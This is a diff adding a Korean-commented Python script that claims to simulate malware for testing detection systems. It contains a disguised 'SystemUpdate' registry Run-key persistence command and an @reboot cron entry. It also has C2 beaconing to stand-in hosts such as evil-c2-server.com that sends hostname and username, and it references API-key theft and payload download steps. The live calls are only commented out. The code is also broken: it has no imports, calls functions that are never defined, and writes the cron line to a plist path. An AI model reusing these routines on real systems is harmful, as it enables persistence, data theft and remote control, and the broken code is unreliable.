@@ -1,0 +1,124 @@
+# 지속성 유지 시도 (시작 프로그램에 등록) 시뮬레이션
+def establish_persistence():
+    """
+    시스템 재시작 후에도 실행되도록 지속성 유지를 시도하는 함수 (테스트용)
+    """
+    try:
+        print("[*] 지속성 유지 설정 시도...")
+        
+        # 현재 스크립트 경로
+        current_script = os.path.abspath(__file__)
+        
+        if os.name == 'nt':  # Windows
+            # 레지스트리에 등록 시뮬레이션
+            reg_command = f'REG ADD "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /V "SystemUpdate" /t REG_SZ /F /D "{current_script}"'
+            print(f"[*] 레지스트리 명령: {reg_command}")
+            # 실제로는 실행되지 않음
+            # subprocess.call(reg_command, shell=True)
+        else:  # Unix/Linux/Mac
+            # crontab에 등록 시뮬레이션
+            cron_job = f"@reboot python3 {current_script}\n"
+            cron_file = os.path.expanduser("~/library/LaunchAgents/com.update.plist")
+            print(f"[*] cron 작업: {cron_job}")
+            print(f"[*] cron 파일: {cron_file}")
+            # 실제로는 실행되지 않음
+            # with open(cron_file, 'w') as f:
+            #     f.write(cron_job)
+        
+        print("[+] 지속성 유지 설정 완료")
+        return True
+    except Exception as e:
+        print(f"[-] 지속성 유지 설정 중 오류: {e}")
+        return False
+
+# C2 서버 통신 시뮬레이션
+def connect_to_c2_server():
+    """
+    명령 및 제어(C2) 서버와 통신을 시도하는 함수 (테스트용)
+    """
+    try:
+        print("[*] C2 서버 연결 시도...")
+        
+        # 가상의 C2 서버 주소
+        c2_servers = [
+            "evil-c2-server.com",
+            "command-control.xyz",
+            "192.168.1.100"
+        ]
+        
+        for server in c2_servers:
+            try:
+                print(f"[*] 연결 시도: {server}:443")
+                # 실제로는 연결되지 않음 (테스트용)
+                # socket.create_connection((server, 443), timeout=5)
+                # 데이터 송수신 시뮬레이션
+                system_info = {
+                    "hostname": socket.gethostname(),
+                    "platform": sys.platform,
+                    "username": os.getlogin(),
+                    "timestamp": datetime.now().isoformat()
+                }
+                print(f"[*] 전송 데이터: {json.dumps(system_info)}")
+                
+                # 명령 수신 시뮬레이션
+                fake_commands = ["collect_data", "screenshot", "keylog_start", "download_additional_payload"]
+                received_command = random.choice(fake_commands)
+                print(f"[+] 수신된 명령: {received_command}")
+                
+                print(f"[+] 서버 {server}와 통신 성공")
+                return True
+            except:
+                print(f"[-] 서버 {server}와 통신 실패, 다음 서버 시도...")
+                continue
+        
+        print("[-] 모든 C2 서버 연결 실패")
+        return False
+    except Exception as e:
+        print(f"[-] C2 서버 연결 중 오류: {e}")
+        return False
+
+# 메인 실행 함수
+def main():
+    """
+    주요 악성 행위를 시뮬레이션하는 메인 함수
+    """
+    print("=" * 60)
+    print("악성코드 탐지 테스트 시작 (교육 목적으로만 사용하세요!)")
+    print("=" * 60)
+    
+    # 관리자 권한 확인
+    is_admin = check_privileges()
+    print(f"[*] 관리자 권한: {'예' if is_admin else '아니오'}")
+    
+    # 각 악성 행위 시뮬레이션 실행
+    steps = [
+        ("OpenAI API 키 탐색 및 유출 시도", extract_and_send_api_keys),
+        ("악성 파일 다운로드 및 실행 시도", download_and_execute_malware),
+        ("지속성 유지 설정 시도", establish_persistence),
+        ("C2 서버 연결 시도", connect_to_c2_server)
+    ]
+    
+    results = {}
+    
+    for description, function in steps:
+        print("\n" + "-" * 50)
+        print(f"[*] 단계: {description}")
+        print("-" * 50)
+        
+        # 악성 행위 시뮬레이션 실행 (실제로는 아무것도 하지 않음)
+        success = function()
+        results[description] = "성공" if success else "실패"
+    
+    # 결과 요약
+    print("\n" + "=" * 60)
+    print("악성코드 탐지 테스트 결과 요약")
+    print("=" * 60)
+    
+    for step, result in results.items():
+        print(f"[{result}] {step}")
+    
+    print("\n[!] 참고: 이 스크립트는 실제로 악성 행위를 수행하지 않습니다.")
+    print("[!] 이 코드는 오직 악성코드 탐지 시스템 테스트 목적으로만 사용되어야 합니다.")
+
+if __name__ == "__main__":
+    main()
